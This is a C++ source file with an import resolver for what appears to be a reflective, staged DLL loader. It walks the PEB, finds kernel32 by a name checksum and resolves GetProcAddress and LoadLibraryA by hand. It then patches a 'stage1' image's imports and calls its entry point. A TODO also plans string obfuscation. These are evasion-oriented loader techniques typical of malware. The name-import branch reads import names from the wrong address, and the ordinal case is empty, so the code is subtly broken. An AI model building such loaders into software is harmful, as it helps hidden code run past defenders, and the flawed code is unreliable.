#include "PeUtils.hpp"
#include "ReflectiveResolver.hpp"

#include "winternl.h"

namespace reflective_resolver
{

__declspec(dllexport) void resolve_imports(PREFLECTIVE_PARAMS params)
{
	static constexpr uint64_t PEB_OFFSET = 0x60;
	PPEB peb = reinterpret_cast<PPEB>(__readgsqword(PEB_OFFSET));
	PPEB_LDR_DATA ldr = peb->Ldr;
	PLDR_DATA_TABLE_ENTRY root_module_entry = CONTAINING_RECORD(ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	PLDR_DATA_TABLE_ENTRY module_entry = root_module_entry;
	Address64 kernel32_base = 0;
	static constexpr size_t KERNEL32_CHECKSUM = 331;
	Byte* stage1_raw = reinterpret_cast<Byte*>(params->base_address);

	do
	{
		if (pe_utils::calculate_module_checksum(module_entry->FullDllName.Buffer) == KERNEL32_CHECKSUM)
		{
			kernel32_base = reinterpret_cast<Address64>(module_entry->DllBase);

			break;
		}

		module_entry = CONTAINING_RECORD(module_entry->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	} while (module_entry != root_module_entry);

	if (!kernel32_base)
	{
		return;
	}

	Byte* kernel32_raw = reinterpret_cast<Byte*>(kernel32_base);

	// TODO: make string obfuscator that I can use before the pe is fully loaded (no std)
	Address64 get_proc_address = pe_utils::pic_get_export_by_name(kernel32_raw, "GetProcAddress");
	GETPROCADDRESS GetProcAddressPointer = reinterpret_cast<GETPROCADDRESS>(get_proc_address);

	Address64 load_library_address = pe_utils::pic_get_export_by_name(kernel32_raw, "LoadLibraryA");
	LOADLIBRARYA LoadLibraryAPointer = reinterpret_cast<LOADLIBRARYA>(load_library_address);

	Address64 dll_main_address = pe_utils::pic_get_export_by_name(stage1_raw, "DllEntryPoint");
	DLLENTRYPOINT DllMainPointer = reinterpret_cast<DLLENTRYPOINT>(dll_main_address);

	PIMAGE_IMPORT_DESCRIPTOR current_import = pe_utils::pic_get_first_import(stage1_raw, params->base_address);
	while (current_import->Name)
	{
		HMODULE library_address = LoadLibraryAPointer(reinterpret_cast<LPCSTR>(params->base_address + current_import->Name));

		PIMAGE_THUNK_DATA64 original_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(params->base_address + current_import->OriginalFirstThunk);
		PIMAGE_THUNK_DATA64 first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(params->base_address + current_import->FirstThunk);

		while (first_thunk->u1.AddressOfData)
		{
			if (original_first_thunk && original_first_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
			{
				// TODO: add code for this case
			}
			else
			{
				first_thunk->u1.AddressOfData = reinterpret_cast<Address64>(GetProcAddressPointer(library_address, reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(first_thunk)->Name));
			}

			first_thunk++;
			if (original_first_thunk)
			{
				original_first_thunk++;
			}
		}

		current_import++;
	}

	DllMainPointer(NULL, DLL_PROCESS_ATTACH, params->command_line);
}

}
